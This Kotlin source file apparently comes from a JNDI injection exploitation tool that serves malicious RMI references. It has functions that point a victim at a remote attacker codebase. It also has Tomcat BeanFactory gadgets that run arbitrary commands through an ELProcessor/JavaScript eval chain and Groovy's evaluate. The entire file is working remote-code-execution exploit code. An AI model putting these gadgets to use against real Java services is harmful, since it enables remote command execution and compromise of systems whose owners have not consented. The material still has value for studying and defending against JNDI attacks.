package rmi

import org.apache.naming.ResourceRef
import util.Options
import util.base46cmd
import java.net.URL
import javax.naming.Reference
import javax.naming.StringRefAddr

fun RMIServer.execByRemoteRef(mapping: String): Reference {
    val codebase = URL("http://${Options.address}:${Options.httpPort}/")
    return Reference("foo", mapping, "$codebase#$mapping")
}

fun RMIServer.execByEL() =
    ResourceRef(
        "javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        add(StringRefAddr("forceString", "x=eval"))
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        add(
            StringRefAddr(
                "x",
                """
                    "".getClass()
                    .forName("javax.script.ScriptEngineManager")
                    .newInstance()
                    .getEngineByName("JavaScript")
                    .eval("java.lang.Runtime.getRuntime().exec('${Options.command}')")
                    """.trimIndent().replace("\n", "")
            )
        )
    }

fun RMIServer.execByGroovy() =
    ResourceRef(
        "groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=evaluate"))
        add(StringRefAddr("x", "'${base46cmd(Options.command)}'.execute()"))
    }

